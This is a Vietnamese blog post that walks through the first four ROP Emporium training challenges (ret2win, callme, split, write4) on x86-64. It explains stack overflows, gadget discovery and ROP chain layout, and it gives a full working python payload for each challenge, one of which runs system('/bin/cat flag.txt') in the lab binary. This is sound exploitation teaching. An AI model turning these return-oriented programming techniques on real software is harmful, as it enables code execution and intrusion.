@@ -1,0 +1,148 @@
+<!doctype html><html lang=en><head><title>Học khai thác lỗ hổng bảo mật qua ROP Emporium - Part 1 · H4ck & D3v Br0s</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="Minix"><meta name=description content="ROP Gadget in Binary Exploit"><meta name=keywords content="blog,redteam,blueteam,ctfplayer"><meta name=twitter:card content="summary"><meta name=twitter:title content="Học khai thác lỗ hổng bảo mật qua ROP Emporium - Part 1"><meta name=twitter:description content="ROP Gadget in Binary Exploit"><meta property="og:title" content="Học khai thác lỗ hổng bảo mật qua ROP Emporium - Part 1"><meta property="og:description" content="ROP Gadget in Binary Exploit"><meta property="og:type" content="article"><meta property="og:url" content="http://hackdevbros.com/posts/ropemorium-1/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-29T00:00:00+00:00"><meta property="article:modified_time" content="2023-09-29T00:00:00+00:00"><link rel=canonical href=http://hackdevbros.com/posts/ropemorium-1/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.7f9d180e3b3bebba9ba80d55eed1255c35e00764872854736d6ad7db38884ffc.css integrity="sha256-f50YDjs767qbqA1V7tElXDXgB2SHKFRzbWrX2ziIT/w=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.216e36d3eaf6f4cdfd67dc1200c49a8169e6478102977b3e9ac51a064c57054c.css integrity="sha256-IW420+r29M39Z9wSAMSagWnmR4ECl3s+msUaBkxXBUw=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.119.0"></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>H4ck & D3v Br0s</a>
+<input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/posts/>Blog</a></li><li class=navigation-item><a class=navigation-link href=https://docs.hackdevbros.com>Docs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=http://hackdevbros.com/posts/ropemorium-1/>Học khai thác lỗ hổng bảo mật qua ROP Emporium - Part 1</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
+<time datetime=2023-09-29T00:00:00Z>September 29, 2023</time></span>
+<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
+7-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
+<span class=tag><a href=/tags/binary/>binary</a></span>
+<span class=separator>•</span>
+<span class=tag><a href=/tags/exploit/>exploit</a></span>
+<span class=separator>•</span>
+<span class=tag><a href=/tags/rop/>rop</a></span>
+<span class=separator>•</span>
+<span class=tag><a href=/tags/x64/>x64</a></span></div></div></header><div class=post-content><h1 id=rop-emporium>ROP Emporium
+<a class=heading-link href=#rop-emporium><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h1><p><a href=https://ropemporium.com/>ROP Emporium</a> là chuỗi challenge dùng để hướng dẫn cách xây dựng exploit (ROP gadget bypass NX - NonExecute) dành cho newbie, cụ thể là tự build rop gadgets.</p><p>Trước khi bắt đầu cần lưu ý một số thứ:</p><ul><li>Lab được sử dụng ở đây là x64_86, với các kiến trúc khác việc xây dựng rop gadget sẽ khác nhau</li><li>Số lượng offset cần để smashstack và ghi đè địa trỉ trở về trong binary x86 là 40, do đó ta sẽ thêm 40 bytes “A” để ghi đè địa chỉ trả về.</li><li>Lab cần vô hiệu hóa ASLR, ASLR sẽ khiến cho địa chỉ của binary trong bộ nhớ được phân bổ ngẫu nhiên khiến các địa chỉ trong gadget không chính xác (Cần lỗ hổng để leak base address và cộng thêm vào)</li><li>Công cụ sử dụng chủ yếu gồm: Ghidra (RE), rabin2, radare2, Ropper, pwndbg.</li><li>Cấu trúc stack sẽ biễu diễn từ thấp đến cao</li></ul><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>[] -&gt; thấp
+</span></span><span style=display:flex><span>....
+</span></span><span style=display:flex><span>[] -&gt; cao
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>push rdi; sẽ thêm giá trị rdi vào stack và thanh ghi rsp (stack pointer) sẽ giảm
+</span></span><span style=display:flex><span>pop rdi; sẽ lấy giá trị tại đỉnh stack nơi rsp trỏ vào và giá trị rsp sẽ tăng
+</span></span><span style=display:flex><span>mov [rsi], rdi; sẽ lấy giá trị rdi lưu vào tại địa chỉ bộ nhớ lưu trong thanh ghi rsi (địa chỉ sẽ dùng [rsi])
+</span></span></code></pre></div><ul><li>Khi xây dựng rop gadget riêng với kiến trúc x64 sẽ gặp lỗi segfault dù rằng gadget chain vẫn đúng, điều này là do stack alignment của thư viện glibc (bị tại movaps). Do đó trước khi gặp địa chỉ trả về cần phải align stack trước bằng gadget <code>ret;</code> <a href=https://ropemporium.com/guide.html#Common%20pitfalls>https://ropemporium.com/guide.html#Common%20pitfalls</a></li><li>Calling convention x64 khác x86. x64 sẽ lấy argument tại các thanh ghi rdi → arg1, rsi→ arg2, rdx→arg3…., xem tại đây: <a href=http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html>http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html</a></li><li>Khi kết thúc một routine (function) hay callee (hàm được gọi) thì sẽ gặp instruction ret, lúc này stack pointer sẽ tăng lên và lấy giá trị trở về tại đỉnh stack chính là hàm caller (hàm gọi), do đó khi ta ghi đè giá trị này thì sẽ kiểm soát được luồng chương trình theo ý muốn.</li></ul><h2 id=ret2win>Ret2win
+<a class=heading-link href=#ret2win><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>Challenge 1 khá đơn giản khi đã có function ret2win nhiệm vụ chỉ cần trả về địa chỉ của function đó là được</p><p><img src=images/Ret2win/image.png alt></p><p>Tiến hành lấy các gadget cần thiết</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ rabin2 -s ret2win
+</span></span><span style=display:flex><span>[Symbols]
+</span></span><span style=display:flex><span>nth paddr      vaddr      bind   type   size lib name
+</span></span><span style=display:flex><span>―――――――――――――――――――――――――――――――――――――――――――――――――――――
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>36  0x00000756 0x00400756 LOCAL  FUNC   27       ret2win
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ python3 Ropper.py -f ret2win
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>0x000000000040053e: ret;
+</span></span></code></pre></div><p>Ta sẽ build stack như sau:</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>  [A*8  ]
+</span></span><span style=display:flex><span>  [.....]
+</span></span><span style=display:flex><span>  [A*8  ] -&gt; 40*A
+</span></span><span style=display:flex><span>  [0x40053e] -&gt; ret;
+</span></span><span style=display:flex><span>  [0x400756] -&gt; ret2win();
+</span></span></code></pre></div><p>Truyền payload vào binary</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>python3 -c &#34;import sys; sys.stdout.buffer.write(b&#39;A&#39;*40 + b&#39;\x3e\x05\x40\x00&#39; + b&#39;\x00&#39;*4  + b&#39;\x56\x07\x40\x00&#39; + b&#39;\x00&#39;*4)&#34; | ./ret2win
+</span></span></code></pre></div><h2 id=callme>Callme
+<a class=heading-link href=#callme><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>Challenge 3 sẽ hướng dẫn gọi 3 hàm liên tiếp theo thứ tự, chỉ cần gọi đúng thứ tự thì sẽ in ra flag</p><p>Reverse bằng Ghidra ta sẽ thấy 3 hàm lần lượt là callme_one, callme_two, callme_three</p><p><img src=images/Callme/image.png alt></p><p>Mỗi hàm cần truyền vào 3 tham số arg1, arg2 và arg3 lần lượt là 0xdeadbeef, 0xcafebabe và 0xd00df00d để có thể gọi hàm kế tiếp</p><p><img src=images/Callme/1_image.png alt></p><p>3 hàm này sử dụng lazy binding để thay đổi địa chỉ trong GOT và sẽ gọi đến địa chỉ hàm trong libcallme.so, tuy nhiên ta chỉ cần gọi địa chỉ của hàm trong binary là được. Tiến hành lấy các gadget cần thiết</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ rabin2 -i callme
+</span></span><span style=display:flex><span>[Imports]
+</span></span><span style=display:flex><span>nth vaddr      bind   type   lib name
+</span></span><span style=display:flex><span>―――――――――――――――――――――――――――――――――――――
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>3   0x004006f0 GLOBAL FUNC       callme_three
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>7   0x00400720 GLOBAL FUNC       callme_one
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>10  0x00400740 GLOBAL FUNC       callme_two
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ python3 Ropper.py -f callme
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;
+</span></span><span style=display:flex><span>0x00000000004006be: ret;
+</span></span></code></pre></div><p>Sử dụng gadget <code>pop rdi; pop rsi; pop rdx; ret;</code> sẽ lấy lần lượt 3 vị trí kế tiếp trong stack làm argument cho hàm trả về của chúng ta</p><p>Ta sẽ build stack như sau:</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>  [A*8  ]
+</span></span><span style=display:flex><span>  [.....]
+</span></span><span style=display:flex><span>  [A*8  ] -&gt; 40*A
+</span></span><span style=display:flex><span>  [0x40093c] -&gt; pop rdi; pop rsi; pop rdx; ret;
+</span></span><span style=display:flex><span>  [0xdeadbeef] -&gt; rdi - arg1
+</span></span><span style=display:flex><span>  [0xcafebabe] -&gt; rsi - arg2
+</span></span><span style=display:flex><span>  [0xd00df00d] -&gt; rdx - arg3
+</span></span><span style=display:flex><span>  [0x4006be] -&gt; ret;
+</span></span><span style=display:flex><span>  [0x400720] -&gt; callme_one();
+</span></span><span style=display:flex><span>  [0x40093c] -&gt; pop rdi; pop rsi; pop rdx; ret;
+</span></span><span style=display:flex><span>  [0xdeadbeef] -&gt; rdi - arg1
+</span></span><span style=display:flex><span>  [0xcafebabe] -&gt; rsi - arg2
+</span></span><span style=display:flex><span>  [0xd00df00d] -&gt; rdx - arg3
+</span></span><span style=display:flex><span>  [0x4006be] -&gt; ret;
+</span></span><span style=display:flex><span>  [0x400740] -&gt; callme_two();
+</span></span><span style=display:flex><span>  [0x40093c] -&gt; pop rdi; pop rsi; pop rdx; ret;
+</span></span><span style=display:flex><span>  [0xdeadbeef] -&gt; rdi - arg1
+</span></span><span style=display:flex><span>  [0xcafebabe] -&gt; rsi - arg2
+</span></span><span style=display:flex><span>  [0xd00df00d] -&gt; rdx - arg3
+</span></span><span style=display:flex><span>  [0x4006be] -&gt; ret;
+</span></span><span style=display:flex><span>  [0x4006f0] -&gt; callme_three();
+</span></span></code></pre></div><p>Truyền payload vào binary</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>python3 -c “import sys;sys.stdout.buffer.write(b&#39;A&#39;*40 + b&#39;\x3c\x09\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\xef\xbe\xad\xde&#39;*2 + b&#39;\xbe\xba\xfe\xca&#39;*2 + b&#39;\x0d\xf0\x0d\xd0&#39;*2 + b&#39;\xbe\x06\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\x20\x07\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\x3c\x09\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\xef\xbe\xad\xde&#39;*2 + b&#39;\xbe\xba\xfe\xca&#39;*2 + b&#39;\x0d\xf0\x0d\xd0&#39;*2 + b&#39;\xbe\x06\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\x40\x07\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\x3c\x09\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\xef\xbe\xad\xde&#39;*2 + b&#39;\xbe\xba\xfe\xca&#39;*2 + b&#39;\x0d\xf0\x0d\xd0&#39;*2 + b&#39;\xbe\x06\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\xf0\x06\x40\x00&#39; + b&#39;\x00&#39;*4)” | ./callme
+</span></span></code></pre></div><h2 id=split>Split
+<a class=heading-link href=#split><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>Challenge 2 hướng dẫn chúng ta truyền string có sẵn trong binary làm argument cho function cho chúng ta sử dụn</p><p><img src=images/Split/image.png alt></p><p>Ta thấy hàm system gọi <code>/bin/ls</code> tuy nhiên ở đây ta muốn lấy nội dung của flag nên ta sẽ lấy chuỗi <code>/bin/cat flag.txt</code> trong section .data của binary để truyền vào arg1 của function system(). Tiến hành lấy các gadget cần thiết</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ rabin2 -i split
+</span></span><span style=display:flex><span>[Imports]
+</span></span><span style=display:flex><span>nth vaddr      bind   type   lib name
+</span></span><span style=display:flex><span>―――――――――――――――――――――――――――――――――――――
+</span></span><span style=display:flex><span>1   0x00400550 GLOBAL FUNC       puts
+</span></span><span style=display:flex><span>2   0x00400560 GLOBAL FUNC       system
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>$ rabin2 -z split
+</span></span><span style=display:flex><span>[Strings]
+</span></span><span style=display:flex><span>nth paddr      vaddr      len size section type  string
+</span></span><span style=display:flex><span>―――――――――――――――――――――――――――――――――――――――――――――――――――――――
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ python3 Ropper.py -f split
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>0x00000000004007c3: pop rdi; ret;
+</span></span><span style=display:flex><span>0x000000000040053e: ret;
+</span></span></code></pre></div><p>Gadget <code>pop rdi; ret;</code> sẽ lấy vị trí kế tiếp trong stack (địa chỉ của chuỗi command in ra flag trong section .data của binary) làm argument cho hàm system</p><p>Ta sẽ build stack như sau:</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>  [A*8  ]
+</span></span><span style=display:flex><span>  [.....]
+</span></span><span style=display:flex><span>  [A*8  ] -&gt; 40*A
+</span></span><span style=display:flex><span>  [0x4007c3] -&gt; pop rdi; ret;
+</span></span><span style=display:flex><span>  [0x601060] -&gt; .data   ascii &#34;/bin/cat flag.txt&#34; -&gt; arg1
+</span></span><span style=display:flex><span>  [0x40053e] -&gt; ret;
+</span></span><span style=display:flex><span>  [0x400560] -&gt; system();
+</span></span></code></pre></div><p>Truyền payload vào binary</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>python3 -c &#34;import sys;sys.stdout.buffer.write(b&#39;A&#39;*40 + b&#39;\xc3\x07\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\x60\x10\x60\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\x3e\x05\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\x60\x05\x40\x00&#39; + b&#39;\x00&#39;*4)&#34; | ./split
+</span></span></code></pre></div><h2 id=write4>Write4
+<a class=heading-link href=#write4><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>Challenge 4 sẽ hướng dẫn một kỹ thuật chính là <strong>write-what-where gadgets,</strong> nơi ta sẽ ghi nội dung bất kỳ vào vị trí nào đó trong memory</p><p>Gadget này sẽ có dạng <code>mov [reg2], reg1</code> nơi ta sẽ ghi nội dung của thanh ghi reg1 vào địa chỉ lưu trong thanh ghi reg2</p><p>Ở bài này ta có sẵn function print_file(*arg1) nhận giá trị tại địa chỉ của arg1 và truyền vào hàm fopen và mở file đó ra, do đó ta cần khiến thanh ghi <code>rdi</code> lưu địa chỉ mà tại đó chứa tên chuỗi “flag.txt” là được</p><p><img src=images/Write4/image.png alt></p><p>Tiến hành lấy các gadget cần thiết</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ rabin2 -i write4
+</span></span><span style=display:flex><span>[Imports]
+</span></span><span style=display:flex><span>nth vaddr      bind   type   lib name
+</span></span><span style=display:flex><span>―――――――――――――――――――――――――――――――――――――
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>4   0x00400510 GLOBAL FUNC       print_file
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ rabin2 -S write4
+</span></span><span style=display:flex><span>[Sections]
+</span></span><span style=display:flex><span>nth paddr        size vaddr       vsize perm name
+</span></span><span style=display:flex><span>―――――――――――――――――――――――――――――――――――――――――――――――――
+</span></span><span style=display:flex><span>23  0x00001028   0x10 0x00601028   0x10 -rw- .data
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ python3 Ropper.py -f write4
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>0x0000000000400690: pop r14; pop r15; ret;
+</span></span><span style=display:flex><span>0x0000000000400628: mov qword ptr [r14], r15; ret;
+</span></span><span style=display:flex><span>0x0000000000400693: pop rdi; ret;
+</span></span><span style=display:flex><span>0x00000000004004e6: ret;
+</span></span></code></pre></div><p>Sử dụng gadget <code>pop r14; pop r15; ret;</code>  sẽ lấy lần lượt vị trí kế trong stack lưu vào r14 (địa chỉ vaddr của .data section vì nó có quyền ghi -rw-) và kế sau lưu vào r15 (chuỗi “flag.txt” vừa đủ 8 byte nên ta không cần thêm)</p><p>Sau đó ta gọi gadget <code>mov qword ptr [r14], r15; ret;</code> để lấy giá trị trong r15 lưu tại vị trí tại địa chỉ lưu trong r14 cũng chính là .data section.</p><p>Cuối cùng là truyền địa chỉ vào arg1 bằng gadget <code>pop rdi; ret;</code> với địa chỉ của .data section</p><p>Ta sẽ build stack như sau:</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>[A*8  ]
+</span></span><span style=display:flex><span>[.....]
+</span></span><span style=display:flex><span>[A*8  ] -&gt; 40*A
+</span></span><span style=display:flex><span>[0x400690] -&gt; pop r14; pop r15; ret;
+</span></span><span style=display:flex><span>[0x601028] -&gt; -rw- .data -&gt; r14
+</span></span><span style=display:flex><span>[b&#39;flag.txt&#39;] -&gt; 8 byte &#34;flag.txt&#34; -&gt; r15
+</span></span><span style=display:flex><span>[0x400628] -&gt; mov qword ptr [r14], r15; ret; -&gt; lấy &#39;flag.txt&#39; lưu vào .data
+</span></span><span style=display:flex><span>[0x400693] -&gt; pop rdi; ret; -&gt; arg1
+</span></span><span style=display:flex><span>[0x601028] -&gt; -rw- .data -&gt; địa chỉ lưu &#39;flag.txt&#39; -&gt; arg1
+</span></span><span style=display:flex><span>[0x4004e6] -&gt; ret;
+</span></span><span style=display:flex><span>[0x400510] -&gt; print_file(*rdi);
+</span></span></code></pre></div><p>Truyền payload vào binary</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>python3 -c &#34;import sys;sys.stdout.buffer.write(b&#39;A&#39;*40 + b&#39;\x90\x06\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\x28\x10\x60\x00&#39; + b&#39;\x00&#39;*4 + b&#39;flag.txt&#39; + b&#39;\x28\x06\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\x93\x06\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\x28\x10\x60\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\xe6\x04\x40\x00&#39; + b&#39;\x00&#39;*4 + b&#39;\x10\x05\x40\x00&#39; + b&#39;\x00&#39;*4)&#34; | ./write4
+</span></span></code></pre></div></div><footer></footer></article></section></div><footer class=footer><section class=container>©
+2022 -
+2023
+Minix
+·
+Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.27afce394fb6284f521b3fbc9f6a8326342333c3092267f3944d770489876fed.js integrity="sha256-J6/OOU+2KE9SGz+8n2qDJjQjM8MJImfzlE13BImHb+0="></script></body></html>
